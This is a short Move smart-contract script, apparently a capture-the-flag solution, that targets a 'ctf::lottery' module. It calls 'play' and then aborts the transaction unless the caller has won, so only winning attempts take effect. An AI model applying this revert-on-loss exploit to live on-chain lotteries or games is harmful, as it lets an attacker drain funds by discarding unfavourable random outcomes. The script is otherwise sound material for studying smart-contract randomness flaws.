script {
    use std::signer::address_of;
    use ctf::lottery::{play, has_won};

    const E_lose :u64 =1;

    fun attack(caller:&signer){
        

        play(caller);

        let has_won_after =has_won(address_of(caller));

        if(!has_won_after){
            abort E_lose
        }

    }


}